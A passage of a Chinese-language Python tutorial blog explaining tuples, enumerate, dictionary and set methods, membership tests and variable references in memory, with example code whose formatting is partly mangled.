<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例2：a = [11,22,33,(26,35)]a[1][0] = 99  #错误，a[1]所对应的是一个元组，所以该元组的元素a[1][0]不可修改a[1] = 88  #结果为a = [11,22,33,88] ,此处修改的是一个整体，该整体属于该列表的直属元素，所以可以修改#示例3：a = (3,6,[9,20])a[-1] = 80  #错误，处处修改的是一个整体，该整体只属于元组的元素，所以无法修改a[-1][0] = 666  #正确，因为该整体虽然属于元组的直属元素，但是这里并没有修改该整体，同时该整体是一个列表，所以如果我们修改该整体的内部元素，取决于该列表，显而易见，列表的直属元素是可以修改的</span></span><br></pre></td></tr></table></figure>



<h4 id="3-6-6-enumerate构造索引序列"><a href="#3-6-6-enumerate构造索引序列" class="headerlink" title="3.6.6 enumerate构造索引序列"></a>3.6.6 enumerate构造索引序列</h4><p>索引序列：</p>
<ul>
<li><p>基本构成：（索引，值）</p>
</li>
<li><p>含义：该函数将列表、元组、字符串的下表（索引）和值提取出来，每一个下表和其对应的值放在一个小括号里</p>
</li>
<li><p>用途：更方便的提取列表、元组、字符串的索引和值，一般用在for循环中</p>
</li>
<li><p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">googs = [<span class="string">&#x27;汽车&#x27;</span>,<span class="string">&#x27;飞机&#x27;</span>,<span class="string">&#x27;火箭&#x27;</span>]<span class="keyword">for</span> index,value <span class="keyword">in</span> <span class="built_in">enumerate</span>(googs):  <span class="comment">#此处相当于将googs转化为了(0,&#x27;汽车&#x27;)  (1,&#x27;飞机&#x27;)  (2,&#x27;火箭&#x27;)    print(index,value)&#x27;&#x27;&#x27;结果为：0 汽车1 飞机2 火箭&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-7-字典"><a href="#3-7-字典" class="headerlink" title="3.7 字典"></a>3.7 字典</h3><h4 id="3-7-1-基本构造"><a href="#3-7-1-基本构造" class="headerlink" title="3.7.1 基本构造"></a>3.7.1 基本构造</h4><p>英文：dict</p>
<p>应用场景：使用于储存对象有多个属性，比如要录入一个人的姓名、性别、年龄等类似的有多个属性的</p>
<p>表现形式：用大括号{}括起来</p>
<p>基本结构：</p>
<ul>
<li><p>每个元素由   键 +  ‘ :  ‘  +  值组成，键和值是一个整体</p>
</li>
<li><p>键就类似于字典和元组的索引，不过索引彼此有关联，键没有关联，只有不可变的数据类型才可以作为字典的键</p>
</li>
<li><p>```python<br>a = {键:值,键:值}   #每一个元素由键和值组成，键和值是一个整体；多个元素用逗号分隔</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">#### 3.7.2 字典的方法</span><br><span class="line"></span><br><span class="line">取值一：索引取某个元素：a[&#x27;键&#x27;]</span><br><span class="line"></span><br><span class="line">- 缺点：如果该键不存在，那么程序会报错</span><br><span class="line">- 易错点：取值一定要用中括号[]，千万别用大括号&#123;&#125;</span><br><span class="line">- 区别：大括号里只能填 键</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#错误做法：取值用了大括号a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;print(a&#123;&#x27;name&#x27;&#125;)   #报错：SyntaxError: invalid syntax#正确做法：用中括号[]取值a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;print(a[&#x27;name&#x27;])    #结果为 张三#取一个不存在的键，程序报错a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;print(a[&#x27;fun&#x27;])       #报错：KeyError: &#x27;fun&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>取值二：get方法取值（推荐使用该方法取值）</p>
<ul>
<li>优点：不管取得键存不存在，使用get，程序都不会报错</li>
<li>如果存在，则返回取出来的值，如果不存在，则默认返回None</li>
<li>可以指定返回参数，当键不存在，可以返回其他的我们自定义的字符（非None），只需要在括号了多添加一个参数即可</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正常取值a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;print(a.get(&#x27;name&#x27;))     #结果为：张三 #取一个不存在的键，程序不会报错，但是返回Nonea = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;print(a.get(&#x27;fun&#x27;))     #结果为：None#如果不存在键，可以返回自定义的字符（非None）a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;print(a.get(&#x27;fun&#x27;,&#x27;该键不存在&#x27;))  #结果为：该键不存在</span></span><br></pre></td></tr></table></figure>





<p>获取所有元素的键：a.keys()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">28</span>,<span class="string">&#x27;性别&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;key_all = a.keys()<span class="built_in">print</span>(key_all)     <span class="comment">#获取所有键值，结果为：dict_keys([&#x27;name&#x27;, &#x27;age&#x27;, &#x27;性别&#x27;])</span></span><br></pre></td></tr></table></figure>



<p>获取所有的值：a.values()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">28</span>,<span class="string">&#x27;性别&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;key_all = a.values()<span class="built_in">print</span>(key_all)     <span class="comment">#获取所有的值，结果为：dict_values([&#x27;张三&#x27;, 28, &#x27;男&#x27;])</span></span><br></pre></td></tr></table></figure>

<p>获取所有字典的元素：a.items()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取字典的所有元素，键和值作为一个整体获取a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;key_all = a.items()print(key_all)#结果为：dict_items([(&#x27;name&#x27;, &#x27;张三&#x27;), (&#x27;age&#x27;, 28), (&#x27;性别&#x27;, &#x27;男&#x27;)])#分别取出字典所有元素的键和值a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;for k,v in a.items() :    print(k,v)&#x27;&#x27;&#x27;结果为：name 张三age 28性别 男&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<p>获取字典长度：len(a)</p>
<ul>
<li><p>和列表、元组、字符串的区别：</p>
<ul>
<li><p>因为字典里，键和值是一个整体，键+值这个整体才是该列表的一个元素，才算一个长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">28</span>,<span class="string">&#x27;性别&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))</span><br><span class="line"><span class="comment">#结果为：3</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>切片（没有该功能）</p>
<ul>
<li>原因：因为列表、元组、字符串是根据索引来切片，但是他们的索引是有关联的；但是字典是根据键来索引的，很明显，键之间没有关联，所以无法切片</li>
</ul>
<p>删除一：</p>
<ul>
<li><p>因为字典中键和值是一个整体，该整体是字典的一个元素，所以我们执行语句del a[‘name’]就相当于删掉了键name所在的这个元素，删除的是这个元素，即键和值都删除了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">28</span>,<span class="string">&#x27;性别&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> a[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#结果为：&#123;&#x27;age&#x27;: 28, &#x27;性别&#x27;: &#x27;男&#x27;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>删除二：pop()</p>
<ul>
<li><p>区别：pop删除返回的只是值，没有键</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">28</span>,<span class="string">&#x27;性别&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">b = a.pop(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a,b,sep=<span class="string">&#x27;\n&#x27;</span>)  <span class="comment">#用换行符来分割，方便观看</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">结果：</span></span><br><span class="line"><span class="string">&#123;&#x27;age&#x27;: 28, &#x27;性别&#x27;: &#x27;男&#x27;&#125;</span></span><br><span class="line"><span class="string">张三</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>修改值和增加元素一：</p>
<ul>
<li>如果字典里有相同的键，那么执行下面语句就是修改值：a{‘键’} = ’数据‘</li>
<li>如果字典里没有相同的键，那么执行下列语句就是相当于直接添加一个新元素：a[‘键’] = ’数据‘</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改值：列表的有键：age，所以执行下列语句就可以修改a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;a[&#x27;age&#x27;] = 999print(a)#结果为：&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 999, &#x27;性别&#x27;: &#x27;男&#x27;&#125;#新增元素：列表的没有键：funa = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:28,&#x27;性别&#x27;:&#x27;男&#x27;&#125;a[&#x27;fun&#x27;] = &#x27;篮球&#x27;print(a)#结果为：&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 28, &#x27;性别&#x27;: &#x27;男&#x27;, &#x27;fun&#x27;: &#x27;篮球&#x27;&#125;</span></span><br></pre></td></tr></table></figure>



<p>修改值和增加元素一：update()</p>
<ul>
<li><p>含义：添加和更新，如果字典里没有该键值对，则添加，有则更新（相当于修改），将参数的每一个元素添加到字典里</p>
</li>
<li><p>接收参数：序列字典本身，变量（字典）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#a和b里没有相同的键，则新增</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">28</span>,<span class="string">&#x27;性别&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">b =&#123;<span class="string">&#x27;num1&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;num2&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line">a.update(b)</span><br><span class="line"><span class="built_in">print</span>(a)  <span class="comment">#结果为：&#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 28, &#x27;性别&#x27;: &#x27;男&#x27;, &#x27;num1&#x27;: 1, &#x27;num2&#x27;: 2&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#a和b里有相同的键，则修改（更新）</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">28</span>,<span class="string">&#x27;性别&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line">b =&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;李四&#x27;</span>&#125;</span><br><span class="line">a.update(b)</span><br><span class="line"><span class="built_in">print</span>(a)   <span class="comment">#结果为：&#123;&#x27;name&#x27;: &#x27;李四&#x27;, &#x27;age&#x27;: 28, &#x27;性别&#x27;: &#x27;男&#x27;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>修改键：</p>
<ul>
<li><p>键无法直接修改，只能通过先删除后新增的方法来实现另一种形式上的修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过先删除后新增的方法实现另一种意义上的修改键</span></span><br><span class="line"><span class="comment">#这里假设将&#x27;name&#x27;修改为&#x27;姓名&#x27;，因为字典是无序的，所以无论新增加的元素在哪里都可以</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">28</span>,<span class="string">&#x27;性别&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> a[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">a[<span class="string">&#x27;姓名&#x27;</span>] =<span class="string">&#x27;张三&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#结果为：&#123;&#x27;age&#x27;: 28, &#x27;性别&#x27;: &#x27;男&#x27;, &#x27;姓名&#x27;: &#x27;张三&#x27;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>字典和变量的结合使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#实例：张三，30</span></span><br><span class="line">user = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的姓名：&#x27;</span>)</span><br><span class="line">age = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的年龄：&#x27;</span>)</span><br><span class="line">a = &#123;<span class="string">&#x27;姓名&#x27;</span>:user,<span class="string">&#x27;年龄&#x27;</span>:age&#125;</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#结果为：&#123;&#x27;姓名&#x27;: &#x27;张三&#x27;, &#x27;年龄&#x27;: &#x27;30&#x27;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>for循环</p>
<ul>
<li><p>注意点：for + 字典，取出来的只是键而已</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#此处只是单纯的for循环字典</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">36</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a :</span><br><span class="line">    <span class="built_in">print</span>(i)   <span class="comment">#这里打印出来的只是键</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">结果为：</span></span><br><span class="line"><span class="string">name</span></span><br><span class="line"><span class="string">age</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-7-3-字典的嵌套"><a href="#3-7-3-字典的嵌套" class="headerlink" title="3.7.3 字典的嵌套"></a>3.7.3 字典的嵌套</h4><p>分类：</p>
<p>1、列表、元组里嵌套字典（简单）</p>
<p>2、字典里嵌套列表、元组</p>
<p>可嵌套的位置：</p>
<ul>
<li>值的位置，每个值所处的位置都是可以嵌套的</li>
</ul>
<p>为什么字典的键的位置只能修改成数值、字符串、元组，而不能修改成列表、字典？</p>
<ul>
<li>字典的键的目的一般是直观明了，平常修改只需要修改值的位置的数据即可，一般固定不动，所以需要静态不变的数据类型填充在该位置，那么又因为数值、字符串、元组是静态的，不可变的，所以他们可以填充在该位置用来修改键，但是列表、字典是动态的，所以不满足</li>
<li>字典储存在内存中，需要通过一个哈希函数将其转化为数字才能储存在内存中，而哈希函数的一个特点是只可以哈希静态的数据类型，所以列表、字典是动态的导致不满足。</li>
</ul>
<p>特殊情况：</p>
<ul>
<li><p>原因：字典的键不能重复，但是True相当于1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字典的键既有True又有1，只打印一种</span></span><br><span class="line">a = &#123;<span class="literal">True</span>:<span class="string">&#x27;hello&#x27;</span>,<span class="number">1</span>:<span class="string">&#x27;狗屎&#x27;</span>&#125;      <span class="comment">#因为True就相当于1，这里就等价于键重复了</span></span><br><span class="line"><span class="built_in">print</span>(a)                  <span class="comment">#所以只会打印一种</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-7-4-列表-元组-字典的拆分"><a href="#3-7-4-列表-元组-字典的拆分" class="headerlink" title="3.7.4  列表,元组,字典的拆分"></a>3.7.4  列表,元组,字典的拆分</h4><p>特性：假设列表里有n个数据，我们完全可以通过n个变量来对其进行对称赋值来实现取出列表里的数据</p>
<p>适用范围：列表、元组、字典里的数据比较少时可以这样</p>
<ul>
<li><p>例如：[‘你’,’好’]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis = [<span class="string">&#x27;你&#x27;</span>,<span class="string">&#x27;好&#x27;</span>]</span><br><span class="line">a,b = lis</span><br><span class="line"><span class="built_in">print</span>(a,b)   <span class="comment">#结果为   你 好  </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>列表、元组、字典拆分的区别：</p>
<ul>
<li><p>列表、元组拆分方法一直，因为他们的结构类似，正常设置变量然后对称赋值即可去除</p>
</li>
<li><p>字典：字典特殊，因为他的每一个元素都是由键和值组成的，所以我们如果用对称赋值取出的只是键和值的整体，该整体由键和值组成</p>
<ul>
<li><p>怎么去除字典的键和值？</p>
<p>利用for循环即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">28</span>,<span class="string">&#x27;性别&#x27;</span>:<span class="string">&#x27;男&#x27;</span>&#125;<span class="keyword">for</span> k,v <span class="keyword">in</span> a.items() :    <span class="comment">#获取每一个元素里的键和值，此处利用了对称赋值    print(k,v)&#x27;&#x27;&#x27;结果为：name 张三age 28性别 男&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="3-8-集合"><a href="#3-8-集合" class="headerlink" title="3.8 集合"></a>3.8 集合</h3><h4 id="3-8-1-集合基础"><a href="#3-8-1-集合基础" class="headerlink" title="3.8.1 集合基础"></a>3.8.1 集合基础</h4><p>英文：set</p>
<p>含义：是一个存放数据的容器，只有不可变的数据类型才可以作为集合的元素</p>
<p>特点：无序、无重复数据</p>
<p>应用场景：爬虫等需要数据不重复的场景</p>
<p>空集合：set()  ，这里只有一种设置方法，其他数据类型都是两种，比如列表就是list()和[]</p>
<p>表现形式：</p>
<ul>
<li><p>和字典类似都是大括号括起来</p>
</li>
<li><p>大括号里只有数据，没有类似于字典的键</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;  <span class="comment">#这就是集合</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-8-2-集合的方法"><a href="#3-8-2-集合的方法" class="headerlink" title="3.8.2 集合的方法"></a>3.8.2 集合的方法</h4><p>添加数据</p>
<ul>
<li>缺点：接收的参数只支持单个数据，不支持序列</li>
<li>易错点：如果待添加的数据集合里有，那么因为集合的特性：不重复，所以该数据不会被添加</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;    <span class="comment">#集合a.add(50)print(a)   #结果为：&#123;1, 2, 3, 50&#125;</span></span><br></pre></td></tr></table></figure>

<p>批量添加</p>
<ul>
<li><p>特性：将接收的序列里的每个元素添加到集合中，因为集合是无序的，所以添加后数据所在位置也是无序的</p>
</li>
<li><p>缺点：接收的参数不支持单个数据，只支持序列，如果待添加的数据集合里有，那么因为集合的特性：不重复，所以该数据不会被添加</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例1：待添加数据在集合里存在，那么该数据就不会被添加a = &#123;1,2,3&#125;    #集合a.update((1,2))   #待添加的数据集合里有，所以该数据不会被添加print(a)#示例2：将接收的序列里的每一个元素添加到集合里a = &#123;1,2,3&#125;    #集合a.update([66,67])   #因为集合是无序的，所以添加后数据所在位置也是无序的print(a)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>删除</p>
<ul>
<li><p>remove():删除一个不存在的值会报错，可以删除指定内容</p>
</li>
<li><p>discard()：删除一个不存在的值不会报错，可以删除指定内容  （推荐）</p>
</li>
<li><p>pop()：随机删除，因为集合是无序的</p>
</li>
<li><p>clear()：清除集合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#remove删除存在的内容a = &#123;66,32,31,75,96,52&#125;    #集合a.remove(32)print(a)  #结果为：&#123;96, 66, 75, 52, 31&#125;#remove删除不存在的内容，报错a = &#123;66,32,31,75,96,52&#125;    #集合a.remove(100)print(a)    	 #错误：KeyError: 100#discard删除存在内容a = &#123;66,32,31,75,96,52&#125;    #集合a.discard(52)print(a) 		#结果为：&#123;32, 96, 66, 75, 31&#125;#discard删除不存在内容，不报错a = &#123;66,32,31,75,96,52&#125;    #集合a.discard(100)print(a)              #结果为：&#123;32, 96, 66, 75, 52, 31&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>修改</p>
<ul>
<li>集合不存在该功能，因为集合是无序的，无法定位到某个元素所以无法修改</li>
</ul>
<p>求两个集合的交集：intersection</p>
<ul>
<li>定义：求两个集合的共同部分，即共有部分，然后赋值给一个新变量</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="number">66</span>,<span class="number">32</span>,<span class="number">31</span>,<span class="number">75</span>,<span class="number">96</span>,<span class="number">52</span>&#125;    <span class="comment">#集合b = &#123;66,32,101,102&#125; c = a.intersection(b)         #将获取到的2个集合的共同部分赋值给变量cprint(c)              #结果：&#123;32, 66&#125;</span></span><br></pre></td></tr></table></figure>



<p>求两个集合的并集</p>
<ul>
<li><p>定义：将两个集合合并，如果有相同的元素，则只取一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="number">66</span>,<span class="number">32</span>,<span class="number">31</span>,<span class="number">75</span>,<span class="number">96</span>,<span class="number">52</span>&#125;    <span class="comment">#集合b = &#123;66,32,101,102&#125;c = a.union(b)         #将获取到的2个集合的共同部分赋值给变量cprint(c)     #结果为：&#123;32, 96, 66, 101, 102, 75, 52, 31&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>求两个集合的差集</p>
<ul>
<li><p>定义：集合A，集合B，集合A里有集合B里没有的元素，那么这就是求集合A相对于集合B的差集</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#求集合A相对于集合B的差集a = &#123;66,32,31,75,96,52&#125;    #集合b = &#123;66,32,101,102&#125;c = a.difference(b)         #集合a相对于集合b，将集合b里没有的元素提取出来print(c)  #结果为：&#123;96, 75, 52, 31&#125;#求集合B相对于集合A的差集a = &#123;66,32,31,75,96,52&#125;    #集合b = &#123;66,32,101,102&#125;c = b.difference(a)         #集合b相对于集合a，将集合a里没有的元素提取出来print(c)  #结果为：&#123;101, 102&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="3-8-3-集合的嵌套"><a href="#3-8-3-集合的嵌套" class="headerlink" title="3.8.3 集合的嵌套"></a>3.8.3 集合的嵌套</h4><p>原则：集合里只能嵌套不可变的类型，所以列表、字典、集合就无法嵌套在集合里了</p>
<p>特殊情况：</p>
<ul>
<li><p>导致原因：集合的数据不重复</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#集合中True、False和0，1都存在，只会打印其中一个a = &#123;True,0,1,False&#125;      #因为True就相当于1，False相当于0，这里就等价于重复了print(a)            #结果为：&#123;0, True&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-9-None"><a href="#3-9-None" class="headerlink" title="3.9 None"></a>3.9 None</h3><p>意义：占坑</p>
<p>优点：本身不带任何属性</p>
<p>特性：返回的永远是false</p>
<h3 id="3-10-判断数据是否在序列"><a href="#3-10-判断数据是否在序列" class="headerlink" title="3.10 判断数据是否在序列"></a>3.10 判断数据是否在序列</h3><ul>
<li><p>易错点：</p>
<ul>
<li><p>字典：获取数据必须要有键，如果我们使用循环for in 字典，此时获取的只是键，而不是值，所以如果判断一个数据是否在字典里，如果直接加字典，此时判断的只是键而已</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = &#123;<span class="number">1</span>:<span class="string">&#x27;测试&#x27;</span>,<span class="number">2</span>:<span class="string">&#x27;吃饭&#x27;</span>&#125;   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> e:                         <span class="comment">#获取的只是键</span></span><br><span class="line">    <span class="built_in">print</span>(e)  <span class="comment">#结果为 1   2   </span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<ul>
<li>```python<br>#1、判断数据是否在字符串里<br>a = ‘测试oldboy’<br>print(‘测试’ in a)  #True#2、判断数据是否在元组里<br>b = (‘测试’,’狗屎’)<br>print(‘测试’ in b)  #True#3、判断数据是否在列表里<br>c = [‘测试’,’无语’]<br>print(‘测试’ in c)  #True#4、判断数据是否在字典的键里<br>d = {‘测试’:96,’age’:36}<br>print(‘测试’ in d)  #True       #只是和键作比对#5、判断数据是否在字典的值里<br>#方法一：<br>e = {1:’测试’,2:’吃饭’}<br>print(‘测试’ in e.values())  #True#方法二：<br>f = {1:’测试’,2:’吃饭’}<br>switch = ‘不在里面’                  #开关初始化<br>for k in f.keys():<pre><code>    if f[k] == &#39;测试&#39; :
            switch = &#39;在里面&#39;        #更改开关
    else :
            pass
</code></pre>
print(switch)                            #打印开关#6、判断数据是否在字典的元素里<br>g = {1:’1’,’2’:’吃饭’}<br>switch = ‘不存在’<br>for item in g.items():<pre><code>    item = list(item)
    if &#39;测试&#39; in item :
            switch = &#39;存在&#39;
    else :
            pass
</code></pre>
print(switch)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 3.11 设置空数据类型</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#有两种设置方法的数据类型如下：m = 123m = int()            #空整型，相当于0n = bool()     		#空布尔型，相当于Falsen = True/Falsea = &#x27;&#x27;              #方法一：空字符串a = str()           #方法二：空字符串b = ()b = tuple()c = []c = list()d = &#123;&#125;d = dict()#只有1种设置方法的如下：e = set()    #设置空集合，只有这一种设置方式</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-12-序列的查找效率问题"><a href="#3-12-序列的查找效率问题" class="headerlink" title="3.12 序列的查找效率问题"></a>3.12 序列的查找效率问题</h3><p>字典 &gt; 列表、元组</p>
<ul>
<li>原因：使用for循环，查找列表、元组里的元组是从第一位一直一直往后匹配；而字典不一样，因为字典的key是用哈希直接转换为数字（可以理解成地址），可以直接根据哈希值来查找，所以速度很快</li>
<li>推荐：字典</li>
</ul>
<h3 id="3-13-序列与内存"><a href="#3-13-序列与内存" class="headerlink" title="3.13 序列与内存"></a>3.13 序列与内存</h3><p>方法：id()     查看内存地址</p>
<p>意义：深入了解序列的修改、赋值在内存中的原理，假设[3,2,5]对应的内存地址是01011010，a指向它，b也指向改地址，那么一旦该地址的内容发生了更改，a和b的值也会更改</p>
<p>把握原则：如果一个可变序列的值修改了，那么所有指向它的变量的值都会改变；前提是可变序列</p>
<ul>
<li><p>赋值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">3</span>  <span class="comment">#实际上是将3在内存中的地址放到了a中</span></span><br></pre></td></tr></table></figure></li>
<li><p>修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例1：a = [1,2,3]  #将该列表的内存地址给了ab = [1,2,3]   #新开辟一块内存，存放列表[1,2,3]的地址print(id(a),id(b))#结果为：194402240 194171648#示例2：a = [1,2,3]  #将该列表的内存地址给了ab = a        #a中存储的列表的地址又给了b，所以b指向的也是列表print(id(a),id(b))   #a，b的地址是一样的，都是指向同一个列表#示例3：a = [1,2,3]  #将该列表的内存地址给了ab = a        #a中存储的列表的地址又给了b，所以b指向的也是列表a = [4,5]print(id(a),id(b))   #b指向的还是列表[1,2,3]，但是a因为重新赋值，所以它指向了一个新的列表[4,5]print(a,b)         #a变成了[4,5]，但是b不变，因为b指向的始终是列表[1,2,3]&#x27;&#x27;&#x27;结果为：194171776 194402240[4, 5] [1, 2, 3]&#x27;&#x27;&#x27;#示例4：可变序列修改，所有指向它的变量的值都会改变（一）    a = [1,2,3]  #将该列表的内存地址给了a    b = a       #将b指向序列[1,2,3]    a.append(4)    #此处修改的是a指向的序列[1,2,3]，所以所有指向该序列的变量都会改变    print(id(a),id(b),a,b)    #结果为：194402368 194402368 [1, 2, 3, 4] [1, 2, 3, 4]        